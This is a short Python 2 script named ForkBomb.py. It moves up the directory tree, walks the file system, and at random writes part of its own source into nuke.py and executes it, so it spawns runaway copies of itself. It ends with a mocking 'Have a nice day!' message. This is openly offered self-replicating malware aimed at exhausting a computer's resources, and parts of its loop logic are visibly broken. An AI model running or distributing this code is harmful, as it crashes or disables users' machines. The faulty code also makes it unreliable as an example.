import os
import platform
import random
main = open("ForkBomb.py", 'rb')
if str(platform.system()) == 'Windows':
	slash = "\\"
else:
	slash = "//"
for item in os.getcwd().split(slash)[:len(str(os.getcwd()).split(slash)) - (len(str(os.getcwd()).split(slash)) - 5)]:
	print item
	os.chdir(".." + slash)
for dirs in os.walk(os.getcwd()):
	try:
		x = random.randint(1,2)
		if x == 1:
			fork = open("nuke.py", 'wb')
			i = 0
			for line in main and i < 29:
				i += 1
				fork.write(main.readline())
				fork.close()
			if str(platform.system()) == 'Windows':
				os.system("nuke.py")
			else:
				os.system("python nuke.py")
	except Exception:
		pass
	print u'\u2622 \u263AHave a nice day!\u263A \u2622'

for item in os.walk(os.getcwd()):
	if item == 'nuke.py':
		os.remove('nuke.py')